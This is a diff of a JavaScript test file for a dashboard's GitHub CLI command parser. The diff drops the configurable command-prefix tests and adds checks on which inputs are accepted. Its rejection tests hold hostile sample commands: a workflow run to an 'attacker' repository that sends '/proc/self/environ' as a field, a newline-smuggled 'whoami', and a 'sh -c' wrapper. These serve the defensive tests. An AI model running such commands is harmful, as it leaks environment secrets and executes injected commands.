@@ -1,14 +1,10 @@
 import assert from "node:assert/strict";
-import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
-import { tmpdir } from "node:os";
-import { join } from "node:path";
 import test from "node:test";
 
 import {
   ensureGhAwAvailable,
   executeDashboardCommand,
   parseDashboardCommand,
-  resolveAdditionalCommandPrefixes,
   resolveGhAwCompilerVersion,
 } from "../../com.github.copilot/extensions/cao-dashboard/cli-actions.mjs";
 import { composeDashboardDocuments } from "../../dashboard/report/compose-dashboard-documents.mjs";
@@ -24,68 +20,6 @@ test("CLI actions parse quoted gh aw arguments without a shell", () => {
   );
 });
 
-test("CLI actions accept configured GitHub CLI command prefixes", () => {
-  assert.deepEqual(
-    parseDashboardCommand(
-      "gh issue create --repo octo/example",
-      ["gh issue create"],
-    ),
-    ["gh", "issue", "create", "--repo", "octo/example"],
-  );
-  assert.throws(
-    () => parseDashboardCommand("gh issue create --repo octo/example"),
-    /"gh aw <command>" or "gh workflow run <workflow>"/,
-  );
-  assert.throws(
-    () => parseDashboardCommand("gh api user", ["gh issue create"]),
-    /or "gh issue create"/,
-  );
-});
-
-test("CLI actions load additional command prefixes from cao.json", async () => {
-  const root = await mkdtemp(join(tmpdir(), "cao-dashboard-commands-"));
-  const workflows = join(root, ".github", "workflows");
-  await mkdir(workflows, { recursive: true });
-  await writeFile(join(workflows, "cao.json"), JSON.stringify({
-    "control-plane": {
-      web: {
-        "allowed-command-prefixes": ["gh issue create"],
-      },
-    },
-  }));
-
-  try {
-    assert.deepEqual(
-      await resolveAdditionalCommandPrefixes(root),
-      ["gh issue create"],
-    );
-  } finally {
-    await rm(root, { recursive: true, force: true });
-  }
-});
-
-test("CLI actions reject invalid configured command prefixes", async () => {
-  const root = await mkdtemp(join(tmpdir(), "cao-dashboard-commands-"));
-  const workflows = join(root, ".github", "workflows");
-  await mkdir(workflows, { recursive: true });
-  await writeFile(join(workflows, "cao.json"), JSON.stringify({
-    "control-plane": {
-      web: {
-        "allowed-command-prefixes": ["curl https://example.com"],
-      },
-    },
-  }));
-
-  try {
-    await assert.rejects(
-      resolveAdditionalCommandPrefixes(root),
-      /must contain valid GitHub CLI command prefixes/,
-    );
-  } finally {
-    await rm(root, { recursive: true, force: true });
-  }
-});
-
 test("CLI actions reject commands outside supported GitHub CLI commands", () => {
   assert.throws(
     () => parseDashboardCommand("gh api user"),
@@ -97,6 +31,16 @@ test("CLI actions reject commands outside supported GitHub CLI commands", () => 
   assert.throws(() => parseDashboardCommand("gh workflow view"), /must be an explicit/);
   assert.throws(() => parseDashboardCommand('gh workflow run ""'), /must be an explicit/);
   assert.throws(() => parseDashboardCommand("gh workflow run --repo octo/example"), /must be an explicit/);
+  assert.throws(
+    () => parseDashboardCommand(
+      "gh workflow run collect.yml --repo attacker/example -F token=@/proc/self/environ",
+    ),
+    /must be an explicit/,
+  );
+  assert.throws(
+    () => parseDashboardCommand("gh workflow run maintenance.yml --json"),
+    /must be an explicit/,
+  );
   assert.throws(() => parseDashboardCommand("sh -c 'gh aw compile'"), /must be an explicit/);
   assert.throws(() => parseDashboardCommand("gh aw compile\nwhoami"), /single line/);
   assert.throws(() => parseDashboardCommand("gh aw compile '"), /incomplete/);
@@ -270,40 +214,19 @@ test("dashboard actions dispatch workflows without installing gh-aw", async () =
   assert.equal(calls[0][2].env.GIT_AUTHOR_NAME, undefined);
 });
 
-test("dashboard actions execute configured command prefixes", async () => {
-  const root = await mkdtemp(join(tmpdir(), "cao-dashboard-commands-"));
-  const workflows = join(root, ".github", "workflows");
-  const calls = [];
-  await mkdir(workflows, { recursive: true });
-  await writeFile(join(workflows, "cao.json"), JSON.stringify({
-    "control-plane": {
-      web: {
-        "allowed-command-prefixes": ["gh issue create"],
-      },
-    },
-  }));
-
-  try {
-    const result = await executeDashboardCommand({
-      command: "gh issue create --repo octo/example",
-      workingDirectory: root,
-      githubToken: "token-value",
-      execute: async (...args) => {
-        calls.push(args);
-        return { stdout: "created\n", stderr: "" };
-      },
-    });
-
-    assert.equal(result.ok, true);
-    assert.deepEqual(calls.map(([, args]) => args), [[
-      "issue",
-      "create",
-      "--repo",
-      "octo/example",
-    ]]);
-  } finally {
-    await rm(root, { recursive: true, force: true });
-  }
+test("CLI actions accept non-file-backed workflow dispatch inputs", () => {
+  assert.deepEqual(
+    parseDashboardCommand(
+      "gh workflow run maintenance.yml -R octo/example --ref main -f mode=review --raw-field=count=2",
+    ),
+    [
+      "gh", "workflow", "run", "maintenance.yml",
+      "-R", "octo/example",
+      "--ref", "main",
+      "-f", "mode=review",
+      "--raw-field=count=2",
+    ],
+  );
 });
 
 test("dashboard composition merges CLI actions and rejects duplicate ids", () => {
